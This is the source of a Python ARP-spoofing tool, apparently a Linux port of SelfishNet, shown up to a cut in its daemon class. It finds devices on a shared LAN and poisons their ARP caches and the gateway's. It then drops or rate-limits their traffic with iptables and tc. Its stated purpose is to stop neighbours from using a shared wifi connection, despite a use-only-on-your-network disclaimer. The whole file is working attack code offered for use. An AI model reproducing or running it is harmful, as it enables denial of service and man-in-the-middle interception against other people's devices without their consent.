#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SelfishNet-Linux — l'équivalent Linux de SelfishNet (Windows).

But : reprendre le contrôle du wifi partagé quand les voisins saturent la
connexion et empêchent vos agents IA / vos transferts de travailler.

Fonctions :
  * découverte des hôtes du réseau (ARP passif, aucune configuration) ;
  * "pause"  -> le(s) appareil(s) choisi(s) perd(ent) totalement l'accès ;
  * "limit"  -> débit plafonné à N kbit/s (ex. 200 kbit/s : l'appareil croit
                avoir du réseau mais ne peut plus saturer la bande passante) ;
  * "free"   -> rend l'appareil à son état normal ;
  * restauration propre des tables ARP et de toutes les règles au Ctrl-C.

Usage : sudo python3 selfishnet.py <commande>   (voir --help ou README.md)

Avertissement : ne l'utilisez que sur VOTRE réseau / des appareils dont vous
êtes responsable (votre box, votre partage de connexion, votre famille).
"""

import argparse
import ipaddress
import json
import os
import re
import select
import signal
import socket
import subprocess
import sys
import threading
import time
from collections import defaultdict, deque

# ------------------------------------------------------------------ constantes
VERSION = "1.0"

# Certains environnements (sudo sans login shell, containers) n'ont pas
# /usr/sbin dans le PATH : iptables/tc/sysctl y vivent pourtant.
for _p in ("/usr/sbin", "/sbin", "/usr/local/sbin"):
    if _p not in os.environ.get("PATH", "").split(":"):
        os.environ["PATH"] = os.environ.get("PATH", "") + ":" + _p
STATE_DIR = "/var/lib/selfishnet"
STATE_FILE = os.path.join(STATE_DIR, "state.json")
SOCK_FILE = "/run/selfishnet.sock"
IPT_CHAIN = "SELFISHNET"          # chaîne filter (DROP = pause)
MANGLE_CHAIN = "SELFISHNET"       # chaîne mangle (MARKing pour le shaping)
POISON_INTERVAL = 1.5             # secondes entre deux salves ARP
RATE_WINDOW = 3.0                 # fenêtre de mesure du débit (s)
MARK_BASE = 100                   # marge pour les handles tc
REMARK = "NET"                    # divers

PRESETS = {"free": None, "pause": 96, "limit": 500, "stream": 2500}
MAC_MATCH = True        # blocage par MAC possible ? (détecté au premier essai)


# ------------------------------------------------------------------- utilitaires
def run(cmd, check=False):
    """Exécute une commande et renvoie (code_retour, sortie)."""
    try:
        p = subprocess.run(cmd, shell=isinstance(cmd, str), capture_output=True,
                           text=True, timeout=20)
        if check and p.returncode != 0:
            raise RuntimeError(f"{cmd} -> {p.stderr.strip()}")
        return p.returncode, (p.stdout + p.stderr).strip()
    except FileNotFoundError:
        return 127, f"{cmd.split()[0] if isinstance(cmd, str) else cmd[0]} introuvable"
    except subprocess.TimeoutExpired:
        return 124, "timeout"


def ok(cmd):
    return run(cmd)[0] == 0


def require_root():
    if os.geteuid() != 0:
        die("Cette commande doit être lancée en root : sudo python3 selfishnet.py ...")


def die(msg, code=1):
    print(f"\033[31m[!]\033[0m {msg}", file=sys.stderr)
    sys.exit(code)


def info(msg):
    print(f"\033[36m[*]\033[0m {msg}", flush=True)


def good(msg):
    print(f"\033[32m[+]\033[0m {msg}", flush=True)


def warn(msg):
    print(f"\033[33m[!]\033[0m {msg}", flush=True)


def human_rate(kbit):
    if kbit is None:
        return "illimité"
    if kbit >= 1000:
        return f"{kbit/1000:.1f} Mbit/s"
    return f"{int(kbit)} kbit/s"


def human_bytes(b):
    for unit in ("o", "Ko", "Mo", "Go"):
        if b < 1024:
            return f"{b:.0f} {unit}" if unit == "o" else f"{b:.1f} {unit}"
        b /= 1024
    return f"{b:.1f} To"


# ------------------------------------------------------------ réseau (système)
def default_iface():
    rc, out = run("ip -4 route show default")
    if rc == 0:
        m = re.search(r"default\s+via\s+(\S+)\s+dev\s+(\S+)", out)
        if m:
            return m.group(2)
    return None


def iface_ip(iface):
    rc, out = run(f"ip -4 -o addr show dev {iface}")
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", out)
    if not m:
        return None, None
    return m.group(1), int(m.group(2))


def iface_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().lower()
    except OSError:
        return None


def iface_is_wireless(iface):
    return os.path.isdir(f"/sys/class/net/{iface}/wireless") or \
        os.path.exists(f"/sys/class/net/{iface}/phy80211")


def iface_is_ap(iface):
    rc, out = run(f"iw dev {iface} info")
    return rc == 0 and "type AP" in out


def gateway_ip(iface):
    rc, out = run(f"ip -4 route show default dev {iface}")
    m = re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", out)
    return m.group(1) if m else None


def arp_lookup(ip):
    """MAC connue du noyau pour cette IP (table ARP/neigh)."""
    rc, out = run(f"ip neigh show {ip}")
    m = re.search(r"lladdr\s+([0-9a-f:]{17})", out.lower())
    return m.group(1) if m else None


def ip_forward_enabled():
    try:
        return open("/proc/sys/net/ipv4/ip_forward").read().strip() == "1"
    except OSError:
        return False


def set_ip_forward(on):
    run(f"sysctl -w net.ipv4.ip_forward={'1' if on else '0'}")


def tc_available():
    return run("tc -V")[0] == 0


def iptables_available():
    return run("iptables --version")[0] == 0


def load_state():
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except Exception:
        return {}


def save_state(st):
    os.makedirs(STATE_DIR, exist_ok=True)
    tmp = STATE_FILE + ".tmp"
    with open(tmp, "w") as f:
        json.dump(st, f, indent=2)
    os.replace(tmp, STATE_FILE)


# ------------------------------------------------------------------ découverte
_OUI_CACHE = {}
_OUI_LOADED = False


def get_vendor(mac):
    global _OUI_LOADED
    if not mac or mac == "?" or len(mac) < 8:
        return ""
    mac_clean = mac.lower().replace(":", "").replace("-", "")
    if len(mac_clean) < 6:
        return ""
    try:
        first_byte = int(mac_clean[:2], 16)
        if first_byte & 2:
            return "Privé / Aléatoire (iOS/Android/Win11)"
    except ValueError:
        pass

    prefix = mac_clean[:6].upper()
    if prefix in _OUI_CACHE:
        return _OUI_CACHE[prefix]

    if not _OUI_LOADED:
        for path in ("/usr/share/nmap/nmap-mac-prefixes", "/usr/share/ieee-data/oui.txt"):
            if os.path.isfile(path):
                try:
                    with open(path, errors="ignore") as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith("#"):
                                parts = line.split(maxsplit=1)
                                if len(parts) == 2:
                                    _OUI_CACHE[parts[0].upper()] = parts[1]
                    break
                except Exception:
                    pass
        _OUI_LOADED = True

    return _OUI_CACHE.get(prefix, "")


class Discovery:
    """Écoute le réseau (ARP passif + comptage des paquets IP) pour lister les
    appareils connectés et mesurer leur consommation réelle."""

    def __init__(self, iface, my_ip, gateway_ip_, netmask=24):
        self.iface = iface
        self.my_ip = my_ip
        self.gw_ip = gateway_ip_
        self.netmask = netmask or 24
        try:
            self.net = ipaddress.IPv4Network(f"{self.my_ip}/{self.netmask}", strict=False)
        except Exception:
            self.net = None
        self.devices = {}            # ip -> {"mac":..,"first":ts,"last":ts,"pkts":n,"bytes":n}
        now_ts = time.time()
        if self.my_ip:
            self.devices[self.my_ip] = {"mac": None, "first": now_ts, "last": now_ts, "pkts": 0, "bytes": 0}
        if self.gw_ip:
            self.devices[self.gw_ip] = {"mac": None, "first": now_ts, "last": now_ts, "pkts": 0, "bytes": 0}
        self.win = defaultdict(lambda: deque())   # ip -> deque[(ts, size)]
        self.lock = threading.Lock()
        self.sniffer = None
        self.total_bytes = 0
        self.iface_bytes = self._iface_counters()

    # --- compteurs matériels (pour le total « réseau »)
    @staticmethod
    def _iface_counters(iface=None):
        return {}, 0

    def iface_counters(self):
        try:
            rx = int(open(f"/sys/class/net/{self.iface}/statistics/rx_bytes").read())
            tx = int(open(f"/sys/class/net/{self.iface}/statistics/tx_bytes").read())
            return rx + tx
        except OSError:
            return 0

    def start(self):
        from scapy.all import ARP, AsyncSniffer, IP
        self._ARP, self._IP = ARP, IP

        def handle(pkt):
            now = time.time()
            try:
                if pkt.haslayer(ARP):
                    arp = pkt[ARP]
                    ip = arp.psrc
                    if arp.op in (1, 2) and ip and ip != "0.0.0.0" and ip != self.my_ip:
                        if self.net:
                            try:
                                addr = ipaddress.IPv4Address(ip)
                                if addr not in self.net or addr.is_multicast:
                                    return
                            except ValueError:
                                return
                        mac = (arp.hwsrc or "").lower()
                        with self.lock:
                            d = self.devices.get(ip)
                            if not d:
                                self.devices[ip] = {"mac": mac, "first": now,
                                                    "last": now, "pkts": 0, "bytes": 0}
                            else:
                                d["last"] = now
                                if mac and mac != "00:00:00:00:00:00":
                                    d["mac"] = mac
                    return
                if not pkt.haslayer(IP):
                    return
                ip = pkt[IP]
                src, dst, size = ip.src, ip.dst, len(pkt)
                if dst.endswith(".255") or dst == "255.255.255.255":
                    return

                # Filtrer et enregistrer pour chaque hôte local
                for key in (src, dst):
                    if key == self.gw_ip:
                        continue
                    if key != self.my_ip and self.net:
                        try:
                            addr = ipaddress.IPv4Address(key)
                            if addr.is_multicast or addr not in self.net:
                                continue
                        except ValueError:
                            continue
                    with self.lock:
                        d = self.devices.get(key)
                        if d is None:
                            d = self.devices[key] = {"mac": None, "first": now,
                                                     "last": now, "pkts": 0, "bytes": 0}
                        d["last"] = now
                        d["pkts"] += 1
                        d["bytes"] += size
                        q = self.win[key]
                        q.append((now, size))
                        while q and now - q[0][0] > RATE_WINDOW:
                            q.popleft()
            except Exception:
                pass

        self.sniffer = AsyncSniffer(iface=self.iface, prn=handle, store=False,
                                    lfilter=lambda p: True)
        self.sniffer.start()

    def stop(self):
        try:
            if self.sniffer and self.sniffer.running:
                self.sniffer.stop()
        except Exception:
            pass

    def snapshot(self):
        now = time.time()
        out = []
        with self.lock:
            for ip, d in self.devices.items():
                if self.net and ip != self.my_ip:
                    try:
                        if ipaddress.IPv4Address(ip) not in self.net:
                            continue
                    except ValueError:
                        continue
                mac = d.get("mac")
                if not mac or mac == "?":
                    if ip == self.my_ip:
                        mac = iface_mac(self.iface) or "?"
                    elif ip == self.gw_ip:
                        mac = arp_lookup(self.gw_ip) or "?"
                    else:
                        mac = arp_lookup(ip) or "?"
                    d["mac"] = mac
                q = self.win.get(ip)
                if q:
                    while q and now - q[0][0] > RATE_WINDOW:
                        q.popleft()
                    nbytes = sum(s for _, s in q)
                    pps = len(q) / RATE_WINDOW
                else:
                    nbytes = 0
                    pps = 0
                kbit = nbytes * 8 / 1000 / RATE_WINDOW
                out.append({
                    "ip": ip,
                    "mac": mac,
                    "vendor": get_vendor(mac) if mac != "?" else "",
                    "last": d["last"],
                    "age": now - d["last"],
                    "pkts": d["pkts"],
                    "bytes": d["bytes"],
                    "kbit": kbit,
                    "pps": pps,
                })
        # Notre machine d'abord, puis la box, puis les autres hôtes par débit décroissant
        out.sort(key=lambda x: (
            0 if x["ip"] == self.my_ip else (1 if x["ip"] == self.gw_ip else 2),
            -x["kbit"]
        ))
        return out

    def total_kbit(self):
        with self.lock:
            now = time.time()
            total = 0
            for q in self.win.values():
                while q and now - q[0][0] > RATE_WINDOW:
                    q.popleft()
                total += sum(s for _, s in q)
        return total * 8 / 1000 / RATE_WINDOW


# ------------------------------------------------------------------ application
class Enforcer:
    """Applique l'ARP spoofing + les règles iptables/tc pour mettre en pause ou
    brider les appareils choisis."""

    def __init__(self, iface, my_ip, my_mac, gw_ip, gw_mac, netmask):
        self.iface = iface
        self.my_ip = my_ip
        self.my_mac = my_mac
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.netmask = netmask
        self.targets = {}          # ip -> {"mac":..., "mode":"limit"|"pause", "rate":kbit}
        self.lock = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._tc_active = False
        self._tc_ingress = False
        self._shaping_method = None
        self._marks = {}
        self._next_mark = MARK_BASE
        self._chain_ready = False
        self._mangle_ready = False
        self.errors = []

    # ------------------------------------------------------------- ARP spoofing
    def resolve(self, ip, fast=False):
        """Demande la MAC d'une IP (ARP who-has) si elle n'est pas connue."""
        mac = arp_lookup(ip)
        if mac and mac != "00:00:00:00:00:00":
            return mac
        if not fast:
            run(f"ping -c 1 -W 1 {ip}")
            mac = arp_lookup(ip)
            if mac and mac != "00:00:00:00:00:00":
                return mac
        try:
            from scapy.all import ARP, Ether, srp
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(pkt, iface=self.iface, timeout=0.6 if fast else 1.0, retry=0 if fast else 1, verbose=0)
            for _, rcv in ans:
                if rcv.haslayer(ARP):
                    return (rcv[ARP].hwsrc or "").lower()
        except Exception as exc:
            self.errors.append(f"résolution ARP {ip} : {exc}")
        return None

    def _arp_packets(self, ip, mac, restore=False):
        from scapy.all import ARP, Ether
        if restore:
            to_target = Ether(dst=mac, src=self.gw_mac) / ARP(
                op=2, psrc=self.gw_ip, hwsrc=self.gw_mac, pdst=ip, hwdst=mac)
            to_gw = Ether(dst=self.gw_mac, src=mac) / ARP(
                op=2, psrc=ip, hwsrc=mac, pdst=self.gw_ip, hwdst=self.gw_mac)
        else:
            to_target = Ether(dst=mac, src=self.my_mac) / ARP(
                op=2, psrc=self.gw_ip, hwsrc=self.my_mac, pdst=ip, hwdst=mac)
            to_gw = Ether(dst=self.gw_mac, src=self.my_mac) / ARP(
                op=2, psrc=ip, hwsrc=self.my_mac, pdst=self.gw_ip, hwdst=self.gw_mac)
        return [to_target, to_gw]

    def _poison_loop(self):
        from scapy.all import sendp
        while not self._stop.is_set():
            with self.lock:
                targets = dict(self.targets)
            pkts = []
            for ip, cfg in targets.items():
                mac = cfg.get("mac")
                if not mac:
                    continue
                pkts.extend(self._arp_packets(ip, mac))
            if pkts:
                try:
                    sendp(pkts, iface=self.iface, verbose=0)
                except Exception as exc:
                    self.errors.append(f"envoi ARP : {exc}")
                    time.sleep(1)
            self._stop.wait(POISON_INTERVAL)

    def restore_arp(self, ip, mac):
        from scapy.all import sendp
        try:
            sendp(self._arp_packets(ip, mac, restore=True), iface=self.iface,
                  verbose=0, count=5, inter=0.2)
        except Exception:
            pass

    # ------------------------------------------------------------ iptables / tc
    def _ensure_chains(self):
        if not iptables_available():
            return False
        if not self._chain_ready:
            if not ok(f"iptables -n -L {IPT_CHAIN}"):
                ok(f"iptables -N {IPT_CHAIN}")
            if not ok(f"iptables -C FORWARD -j {IPT_CHAIN}"):
                ok(f"iptables -I FORWARD 1 -j {IPT_CHAIN}")
            self._chain_ready = True
        if not self._mangle_ready:
            if not ok(f"iptables -t mangle -n -L {MANGLE_CHAIN}"):
                ok(f"iptables -t mangle -N {MANGLE_CHAIN}")
            if not ok(f"iptables -t mangle -C FORWARD -j {MANGLE_CHAIN}"):
                ok(f"iptables -t mangle -I FORWARD 1 -j {MANGLE_CHAIN}")
            self._mangle_ready = True
        return True

    def _flush_filter(self):
        if not self._chain_ready:
            return
        ok(f"iptables -F {IPT_CHAIN}")
        ok(f"iptables -t mangle -F {MANGLE_CHAIN}")

    # --- détection des capacités du noyau (modules htb/u32/police non compilés ?)
    def _detect_shaping(self):
        """Choisit la meilleure méthode de bridage disponible sur ce noyau."""
        if getattr(self, "_shaping_method", None):
            return self._shaping_method
        method = "none"
        if tc_available():
            rc, out = run(f"tc qdisc replace dev {self.iface} root handle 1: htb default 9999")
            if rc == 0:
                run(f"tc qdisc del dev {self.iface} root")
                method = "tc"
            else:
                self.errors.append(f"tc/htb indisponible ({out.splitlines()[0] if out else '?'})")
        if method == "none":
            rc, _ = run("iptables -t mangle -L FORWARD -n")
            if rc == 0:
                method = "compat"
        self._shaping_method = method
        return method

    def _compat_add_rule(self, spec, rate_kbit):
        """iptables sans état (module 'limit') : ~ rate_kbit de trafic passe,
        le surplus est jeté. Débit lissé par le noyau (pas de compteur)."""
        pps = max(20, int(rate_kbit * 1000 / 8 / 700))      # ~700 o/paquet
        rc, out = run(f"iptables -t mangle -A {MANGLE_CHAIN} {spec} "
                      f"-m limit --limit {pps}/s --limit-burst {max(5, pps // 5)} -j RETURN")
        rc2, out2 = run(f"iptables -t mangle -A {MANGLE_CHAIN} {spec} -j DROP")
        if rc != 0 or rc2 != 0:
            self.errors.append(f"bridge compat {spec} : {(out or out2)[:120]}")
            return False
        return True

    def _tc_init(self):
        rc, out = run(f"tc qdisc show dev {self.iface}")
        if "handle 1: htb" in out:
            self._tc_active = True
            return True
        rc, out = run(f"tc qdisc replace dev {self.iface} root handle 1: htb default 9999")
        if rc != 0:
            self.errors.append(f"tc qdisc : {out}")
            return False
        run(f"tc class replace dev {self.iface} parent 1: classid 1:9999 htb rate 10gbit ceil 10gbit")
        self._tc_active = True
        return True

    def _tc_clear(self):
        if getattr(self, "_tc_active", False):
            run(f"tc qdisc del dev {self.iface} root")
            self._tc_active = False
        run(f"tc filter del dev {self.iface} parent ffff:")
        run(f"tc qdisc del dev {self.iface} ingress")
        self._tc_ingress = False
        self._marks.clear()

    def _apply_shaping(self):
        """Applique le bridage de débit sur les cibles en mode 'limit'."""
        limited = {ip: c for ip, c in self.targets.items()
                   if c.get("mode") == "limit" and c.get("rate")}
        if not limited:
            self._tc_clear()
            return
        method = self._detect_shaping()
        if method == "compat":
            self._ensure_chains()
            ok(f"iptables -t mangle -F {MANGLE_CHAIN}")
            for ip, cfg in limited.items():
                kbit = max(16, int(cfg["rate"]))
                self._compat_add_rule(f"-s {ip}/32", kbit)
                self._compat_add_rule(f"-d {ip}/32", kbit)
            good(f"Débit plafonné (~{human_rate(limited[list(limited)[0]]['rate'])}) "
                 f"sur {len(limited)} appareil(s) [mode compatibilité]")
            return
        if method == "none":
            return
        if not self._tc_init():
            return
        # --- sens montant (client -> box) : police sur l'ingress
        if not getattr(self, "_tc_ingress", False):
            rc, out = run(f"tc qdisc show dev {self.iface} ingress")
            if "ingress" not in out:
                ok(f"tc qdisc add dev {self.iface} handle ffff: ingress")
            self._tc_ingress = True
        run(f"tc filter del dev {self.iface} parent ffff:")
        for ip, cfg in limited.items():
            kbit = max(16, int(cfg["rate"]))
            rc, out = run(f"tc filter add dev {self.iface} parent ffff: protocol ip prio 1 "
                          f"u32 match ip src {ip}/32 police rate {kbit}kbit burst 32k drop")
            if rc != 0:
                self.errors.append(f"police montante {ip} : {out}")
        # --- sens descendant (box -> client) : HTB + marques nf_tables
        for ip, cfg in limited.items():
            mark = self._marks.get(ip)
            if mark is None:
                mark = self._next_mark
                self._next_mark += 1
                self._marks[ip] = mark
            kbit = max(16, int(cfg["rate"]))
            run(f"tc class replace dev {self.iface} parent 1: classid 1:{mark} "
                f"htb rate {kbit}kbit ceil {kbit}kbit burst 20k cburst 20k")
            run(f"tc filter del dev {self.iface} parent 1: handle {mark} fw")
            rc, out = run(f"tc filter add dev {self.iface} parent 1: protocol all "
                          f"handle {mark} fw flowid 1:{mark}")
            if rc != 0:
                self.errors.append(f"filtre descendant {ip} : {out}")
            ok(f"iptables -t mangle -C {MANGLE_CHAIN} -s {ip} -j MARK --set-mark {mark}") or \
                ok(f"iptables -t mangle -A {MANGLE_CHAIN} -s {ip} -j MARK --set-mark {mark}")
            ok(f"iptables -t mangle -C {MANGLE_CHAIN} -d {ip} -j MARK --set-mark {mark}") or \
                ok(f"iptables -t mangle -A {MANGLE_CHAIN} -d {ip} -j MARK --set-mark {mark}")
        good(f"Shaping appliqué sur {len(limited)} appareil(s)")

    def _apply_drop(self):
        """Blocage fort : par IP et par MAC (instantané via iptables-restore ou direct)."""
        paused = {ip: c for ip, c in self.targets.items() if c.get("mode") == "pause"}
        if not paused:
            return
        if not self._ensure_chains():
            self.errors.append("iptables indisponible : impossible de mettre en pause")
            return
        lines = []
        for ip, cfg in paused.items():
            lines.append(f"-A {IPT_CHAIN} -s {ip} -j DROP")
            lines.append(f"-A {IPT_CHAIN} -d {ip} -j DROP")
            mac = (cfg.get("mac") or "").lower()
            if MAC_MATCH and re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", mac):
                lines.append(f"-A {IPT_CHAIN} -m mac --mac-source {mac} -j DROP")

        # Application atomique instantanée en un seul appel (quel que soit le nombre d'appareils)
        payload = f"*filter\n-F {IPT_CHAIN}\n" + "\n".join(lines) + "\nCOMMIT\n"
        try:
            p = subprocess.run(["iptables-restore", "-n"], input=payload, text=True,
                               capture_output=True, timeout=4)
            if p.returncode == 0:
                good(f"Pause appliquée sur {len(paused)} appareil(s) (instantané)")
                return
        except Exception:
            pass

        # Secours : injection directe rapide
        for r in lines:
            ok(f"iptables {r}")
        good(f"Pause appliquée sur {len(paused)} appareil(s)")

    def _mac_rule_unsupported(self):
        global MAC_MATCH
        if MAC_MATCH:
            MAC_MATCH = False
            self.errors.append("règle MAC non supportée par ce noyau → blocage par IP seul")

    def _refresh_rules(self):
        self._flush_filter()
        if not self.targets:
            self._tc_clear()
            return
        self._ensure_chains()
        self._apply_drop()
        self._apply_shaping()

    # ------------------------------------------------------------------ API
    def start(self):
        set_ip_forward(True)
        self._ensure_chains()
        self._thread = threading.Thread(target=self._poison_loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        # 1) restaurer les ARP de toutes les cibles
        with self.lock:
            targets = dict(self.targets)
        for ip, cfg in targets.items():
            if cfg.get("mac"):
                self.restore_arp(ip, cfg["mac"])
        # 2) nettoyer iptables
        self._flush_filter()
        if self._chain_ready:
            ok(f"iptables -D FORWARD -j {IPT_CHAIN}")
            ok(f"iptables -F {IPT_CHAIN}")
            ok(f"iptables -X {IPT_CHAIN}")
        if self._mangle_ready:
            ok(f"iptables -t mangle -D FORWARD -j {MANGLE_CHAIN}")
            ok(f"iptables -t mangle -F {MANGLE_CHAIN}")
            ok(f"iptables -t mangle -X {MANGLE_CHAIN}")
        # 3) nettoyer tc (descendant + montant)
        self._tc_clear()
        self.targets.clear()

    def set_target(self, ip, mac, mode, rate=None):
        self.set_targets_batch([(ip, mac)], mode, rate)

    def set_targets_batch(self, pairs, mode, rate=None):
        freed = []
        with self.lock:
            for ip, mac in pairs:
                if mode == "free":
                    self.targets.pop(ip, None)
                    if mac:
                        freed.append((ip, mac))
                else:
                    self.targets[ip] = {
                        "mac": mac,
                        "mode": mode,
                        "rate": rate or PRESETS.get("limit")
                    }
        if freed:
            threading.Thread(target=self._restore_arp_batch, args=(freed,), daemon=True).start()
        self._refresh_rules()

    def _restore_arp_batch(self, pairs):
        from scapy.all import sendp
        pkts = []
        for ip, mac in pairs:
            if mac and re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", str(mac).lower()):
                pkts.extend(self._arp_packets(ip, mac, restore=True))
        if pkts:
            try:
                sendp(pkts, iface=self.iface, verbose=0, count=3, inter=0.03)
            except Exception:
                pass

    def clear_all(self):
        with self.lock:
            targets = dict(self.targets)
            self.targets.clear()
        pairs = [(ip, cfg.get("mac")) for ip, cfg in targets.items() if cfg.get("mac")]
        if pairs:
            threading.Thread(target=self._restore_arp_batch, args=(pairs,), daemon=True).start()
        self._refresh_rules()

    def summary(self):
        with self.lock:
            return [{"ip": ip, "mac": c["mac"], "mode": c["mode"],
                     "rate": c.get("rate")} for ip, c in self.targets.items()]


# ------------------------------------------------------------------ affichage
HEADER = ("#", "Protégé", "Adresse IP", "MAC", "Fabricant", "Débit", "Paquets", "Vu il y a", "État")


def render_table(rows, targets_state, tty=True):
    c = (lambda s, col: f"\033[{col}m{s}\033[0m") if tty else (lambda s, col: s)
    lines = []
    lines.append("  ".join([
        c(f"{HEADER[0]:>2}", "1"),
        c(f"{HEADER[1]:<7}", "1"),
        c(f"{HEADER[2]:<15}", "1"),
        c(f"{HEADER[3]:<17}", "1"),
        c(f"{HEADER[4]:<22}", "1"),
        c(f"{HEADER[5]:>10}", "1"),
        c(f"{HEADER[6]:>8}", "1"),
        c(f"{HEADER[7]:>10}", "1"),
        c(f"{HEADER[8]:<14}", "1")]))
    lines.append("─" * 115)
    for i, r in enumerate(rows, 1):
        ip = r["ip"]
        st = targets_state.get(ip)
        is_safe = r.get("is_safe", False)
        safe_str = "[OUI]" if is_safe else "  —  "
        safe_col = "32" if is_safe else "90"

        if is_safe and not st:
            state, color = "PROTÉGÉ", "32"
        elif st is None:
            state, color = "libre", "32"
        elif st["mode"] == "pause":
            state, color = "PAUSE", "31"
        else:
            state, color = f"limite {human_rate(st.get('rate'))}", "33"
        age = f"{r['age']:.0f} s" if r["age"] < 120 else f"{r['age']/60:.0f} min"
        vendor = r.get("vendor", "")
        if len(vendor) > 22:
            vendor = vendor[:20] + ".."
        lines.append("  ".join([
            c(f"{i:>2}", "90"),
            c(f"{safe_str:<7}", safe_col),
            c(f"{ip:<15}", "37"),
            c(f"{r['mac']:<17}", "90"),
            c(f"{vendor:<22}", "36"),
            c(f"{r['kbit']:>8.0f} kb", color if st else "37"),
            c(f"{r['pkts']:>8}", "90"),
            c(f"{age:>10}", "90"),
            c(f"{state:<14}", color),
        ]))
    if not rows:
        lines.append("  (aucun appareil local détecté pour le moment)")
    return "\n".join(lines)


def sort_key_ip(ip):
    try:
        return tuple(int(x) for x in ip.split("."))
    except Exception:
        return (999,)


# ------------------------------------------------------------------ watchdog
def selftest(args):
    """Vérifie que la mise en pause fonctionne vraiment sur une IP de test."""
    require_root()
    iface = args.iface or default_iface()
    my_ip, _ = iface_ip(iface)
    gw = gateway_ip(iface)
    print(f"\nTest de bout en bout sur {args.target}\n")
    rc, out = run(f"ping -c 20 -i 0.2 -W 1 {args.target} 2>&1")
    base = re.search(r"(\d+)% packet loss", out)
    base_loss = int(base.group(1)) if base else -1
    info(f"sans bridage : perte {base_loss}% de paquets")

    net = ipaddress.ip_network(f"{my_ip}/{iface_ip(iface)[1]}", strict=False)
    o = Enforcer(iface, my_ip, iface_mac(iface), gw, arp_lookup(gw), net.prefixlen)
    mac = o.resolve(args.target)
    if not mac:
        die("impossible de trouver la MAC : l'appareil est-il allumé et sur le même réseau ?")
    o.start()
    o.set_target(args.target, mac, "pause")
    time.sleep(2)
    rc, out = run(f"ping -c 20 -i 0.2 -W 1 {args.target} 2>&1")
    m = re.search(r"(\d+)% packet loss", out)
    blocked = int(m.group(1)) if m else -1
    info(f"avec pause   : perte {blocked}% de paquets")
    o.stop()
    time.sleep(1)
    rc, out = run(f"ping -c 20 -i 0.2 -W 1 {args.target} 2>&1")
    m = re.search(r"(\d+)% packet loss", out)
    after = int(m.group(1)) if m else -1
    print()
    if blocked >= 90 and base_loss <= 20:
        good("RÉSULTAT : le bridage fonctionne (appareil coupé, puis rétabli).")
    elif blocked >= 50:
        warn("RÉSULTAT : partiel. Cause fréquente : 'isolation des clients' (AP isolation) "
             "activée sur la box, ou l'appareil est lui-même la box.")
    else:
        warn("RÉSULTAT : ça ne coupe pas. Vérifiez : AP isolation désactivée, même réseau, "
             "fichier /proc/sys/net/ipv4/ip_forward, et que vous êtes bien sur un LAN plat.")
    info(f"état après test : perte {after}% (doit revenir au niveau normal)")
    return 0


def doctor(args):
    require_root()
    iface = args.iface or default_iface()
    print("\nDiagnostic SelfishNet-Linux")
    print("=" * 40)
    checks = []
    my_ip, mask = iface_ip(iface) if iface else (None, None)
    gw = gateway_ip(iface) if iface else None
    checks.append(("root", os.geteuid() == 0, "ok"))
    checks.append(("interface", iface is not None, iface or "aucune route par défaut"))
    checks.append(("adresse IP locale", my_ip is not None, f"{my_ip}/{mask}" if my_ip else "absente"))
    checks.append(("passerelle", gw is not None, gw or "introuvable"))
    checks.append(("MAC passerelle", bool(gw and arp_lookup(gw)), arp_lookup(gw) or "inconnue (pingez la box)"))
    checks.append(("ip_forward", ip_forward_enabled(), "1" if ip_forward_enabled() else "0 -> activé auto"))
    checks.append(("iptables", iptables_available(), "présent" if iptables_available() else "installer iptables"))
    checks.append(("tc (shaping)", tc_available(), "présent" if tc_available() else "installer iproute2"))
    try:
        import scapy
        checks.append(("scapy", True, scapy.__version__))
    except Exception:
        checks.append(("scapy", False, "sudo apt install python3-scapy"))
    for name, good_, detail in checks:
        mark = "✅" if good_ else "❌"
        print(f" {mark} {name:<18} {detail}")
    if iface and iface_is_wireless(iface):
        if iface_is_ap(iface):
            print("\n ℹ Cet interface est un point d'accès (hotspot) : vous êtes le routeur,\n"
                  "   le mode pause fonctionnera parfaitement.")
        else:
            print("\n ℹ Station wifi : vous êtes un client de la box. L'ARP spoofing fonctionne\n"
                  "   si la box n'active pas l'isolation des clients (AP isolation).")
    print()
    return 0


# ------------------------------------------------------------------ IPC
def ipc_send(payload, timeout=20):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(SOCK_FILE)
        s.sendall((json.dumps(payload) + "\n").encode())
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
        s.close()
        return json.loads(buf.decode() or "{}")
    except (FileNotFoundError, ConnectionRefusedError):
        return {"error": "daemon_absent"}
    except socket.timeout:
        return {"error": "timeout"}
    except Exception as exc:
        return {"error": str(exc)}


def daemon_alive():
    return os.path.exists(SOCK_FILE) and ipc_send({"cmd": "ping"}) .get("ok") is True


# ------------------------------------------------------------------ daemon
class Daemon:
    def __init__(self, iface=None, rate_default=500):
        require_root()
        self.iface = iface or default_iface()
        if not self.iface:
            die("aucune interface par défaut trouvée (utilisez --iface)")
        self.my_ip, self.mask = iface_ip(self.iface)
        if not self.my_ip:
            die(f"aucune adresse IPv4 sur {self.iface}")
        self.my_mac = iface_mac(self.iface)
        self.gw_ip = gateway_ip(self.iface)
        self.gw_mac = arp_lookup(self.gw_ip) if self.gw_ip else None
        self.rate_default = rate_default
        if not self.gw_mac and self.gw_ip:
            info("passerelle pas encore dans la table ARP, ping…")
            run(f"ping -c 1 -W 2 {self.gw_ip}")
            self.gw_mac = arp_lookup(self.gw_ip)
        self.disc = Discovery(self.iface, self.my_ip, self.gw_ip, self.mask)
        self.enf = Enforcer(self.iface, self.my_ip, self.my_mac,
                            self.gw_ip, self.gw_mac, self.mask)
        self.safe_file = os.path.join(STATE_DIR, "safe_mode.json")
        self.safe_targets = self._load_safe()
        self.running = True
        self.message = "prêt"

    def _load_safe(self):
        try:
